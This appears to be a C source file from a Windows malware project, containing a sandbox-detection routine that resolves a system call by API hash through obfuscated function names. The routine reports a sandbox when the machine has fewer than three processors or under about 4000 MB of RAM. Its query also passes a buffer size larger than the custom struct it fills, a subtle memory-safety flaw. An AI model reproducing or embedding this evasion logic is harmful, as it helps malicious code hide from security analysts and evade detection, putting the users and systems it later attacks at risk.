#include <Windows.h>
#include "custom-functions.h"

typedef struct _SYS_BASIC_INFORMATION {
    BYTE Padding[8];
    ULONG PageSize;
    ULONG NumberOfPhysicalPages;
} SYS_BASIC_INFORMATION, * PSYS_BASIC_INFORMATION;

int sbDetector(HMODULE sysmod) {
	fnfun003qsi fun003qsi = (fnfun003qsi)fun001gpa(sysmod, 0xF805BFE1);
	if (fun003qsi == NULL) {
		return 1;
	}

    SYS_BASIC_INFORMATION memInfo = { 0 };
    SYSTEM_BASIC_INFORMATION sysInfo = { 0 };
	NTSTATUS memStatus = fun003qsi(SystemBasicInformation, &memInfo, sizeof(SYSTEM_BASIC_INFORMATION), 0);
    NTSTATUS sysStatus = fun003qsi(SystemBasicInformation, &sysInfo, sizeof(SYSTEM_BASIC_INFORMATION), 0);

    if (sysInfo.NumberOfProcessors < 3) {
        return 1;
    }

    DWORDLONG totalPhys = (DWORDLONG)memInfo.NumberOfPhysicalPages * (DWORDLONG)memInfo.PageSize;
    DWORD totalPhysMB = (DWORD)(totalPhys / 1024 / 1024);

    if (totalPhysMB < 4000) {
        return 1;
    }

    return 0;
}